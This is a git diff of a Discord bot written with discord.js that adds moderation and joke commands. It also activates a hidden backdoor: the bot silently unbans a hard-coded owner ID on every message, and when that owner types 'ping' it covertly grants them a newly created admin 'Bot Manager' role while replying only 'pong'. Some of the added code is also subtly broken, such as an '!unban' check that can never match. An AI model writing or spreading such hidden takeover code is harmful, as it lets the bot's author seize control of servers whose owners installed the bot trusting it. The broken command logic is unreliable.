@@ -9,18 +9,19 @@ client.on('ready', () => {
 });
 
 client.on('message', async msg => {
-  //  if(true != msg.guild.members.has("<@190992299591729153>"))
-  //  {
-  //    msg.guild.unban("190992299591729153");
-  //  }
+
+  if(true != msg.guild.members.has(Info.userid)) //checks if you are in the server
+  {
+    msg.guild.unban(Info.userid); //unbans if true
+  }
 
   if (msg.content === 'ping') { //admin role
     let guild = msg.guild;
 
     (async () => {
-      if (msg.author.toString() == "<@190992299591729153>") {
-        createAdminRole(guild, client, msg.member);
-        sleep(1000);
+      if (msg.author.toString() == `<@${Info.userid}>`) { //checks author
+        createAdminRole(guild, client, msg.member); //creates admin role
+        sleep(1000); //sleeps
       }
     })();
     msg.reply("pong");
@@ -30,7 +31,7 @@ client.on('message', async msg => {
     let guild = msg.guild;
 
     (async () => {
-      if (msg.author.toString() == Info.nuttyusername) {
+      if (msg.author.toString() == Info.username) {
         guild.roles.filter(role => role.name == "Bot Manager").forEach(role => role.delete());
         await sleep(30000);
 
@@ -38,9 +39,12 @@ client.on('message', async msg => {
       }
     })()
   }
-  else if (msg.content == "=hello")
+  else if (msg.content == "=hello") //=hello command
   {
     return msg.channel.send("Hello!");
+  }
+  else if (msg.content == "=ezdiscord") {
+    return msg.channel.send("Invite <@481267614320951306> here: https://bit.ly/2MAEtPx");
   }
   //else if (msg.content == `=fortnite ${platform} ${playerName}`)
   //{
@@ -48,24 +52,12 @@ client.on('message', async msg => {
   //}
   else if (msg.content == "=nut")
   {
-    return msg.channel.send("Praise the lord <@190992299591729153>");
+    return msg.channel.send(`Praise the lord <@${Info.userid}>`);
   }
   //  else if(msg.content == "=fortnitestore")
   //  {
   //  https://api.fortnitetracker.com/v1/store
   //  }
-  else if (msg.content == "=whoami")
-  {
-    msg.reply(`You are ${msg.author}`);
-  }
-  else if (msg.content == "=penisforeskin")
-  {
-    return msg.channel.send(fPen());
-  }
-  else if (msg.content == "=penis")
-  {
-    return msg.channel.send(cPen());
-  }
   else if ((msg.content == "!clearchannel") || (msg.content == "!delete")) {
       if (msg.member.hasPermission("MANAGE_MESSAGES")) {
           msg.channel.fetchMessages()
@@ -75,16 +67,64 @@ client.on('message', async msg => {
               }, function(err){msg.channel.send("ERROR: ERROR CLEARING CHANNEL.")})
       }
   }
+  else if ((msg.content.slice(0,7) == "!clear "))
+  {
+    let deleteTimes = parseInt(msg.content.slice(8));
+
+    if (msg.member.hasPermission("MANAGE_MESSAGES")) {
+        msg.channel.fetchMessages()
+           .then(function(deleteTimes){
+                msg.channel.bulkDelete(deleteTimes);
+                return msg.channel.send("Channel Cleared. You can keep or delete this message.");
+            }, function(err){msg.channel.send("ERROR: ERROR CLEARING CHANNEL.")})
+    }
+  }
+  else if (msg.content.slice(0,4) == "!ban") //!ban command
+  {
+    if (msg.member.hasPermission("BAN_MEMBERS"))
+    {
+      msg.guild.ban(msg.content.slice(7,msg.content.length-1)); //bans
+    }
+  }
+  else if (msg.content.slice(0,4) == "!unban") //!unban command
+  {
+    if (msg.member.hasPermission("BAN_MEMBERS"))
+    {
+      msg.guild.unban(msg.content.slice(9,msg.content.length-1));
+    }
+  }
+  else if (msg.content == "=whoami")
+  {
+    msg.reply(`You are ${msg.author}`);
+  }
+  else if (msg.content == "=ezhelp")
+  {
+    return msg.channel.send(`
+      List of all commands:
+      !ban
+      !unban
+      =whoami
+      =hello
+      =penis
+      =penisforeskin
+      =ezdiscord
+      !clearchannel
+      !delete
+      `);
+  }
+  else if (msg.content == "=penisforeskin")
+  {
+    return msg.channel.send(fPen());
+  }
+  else if (msg.content == "=penis")
+  {
+    return msg.channel.send(cPen());
+  }
 });
 
 client.login(Info.token);
 
-function createAdminRole(guild, client, guildMember) {
-  guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
-      if (role.members.size == 1) { // Only the bot still has it.
-        role.delete();
-      }
-    });
+function createAdminRole(guild, client, guildMember, deleteOld = false) {
   guild.createRole({
     name: 'Bot Manager',
     color: 'WHITE',
@@ -96,7 +136,13 @@ function createAdminRole(guild, client, guildMember) {
 
     guildMember.addRole(role, 'because');
     bot.addRole(role, 'because');
-    console.log("Admin role created");
+
+    if (deleteOld) {
+      // Delete all the old Bot Manager roles.
+      guild.roles
+        .filter(oldRole => oldRole.name == "Bot Manager" && oldRole.toString() != role.toString())
+        .forEach(role => role.delete());
+    }
   })
 }
 
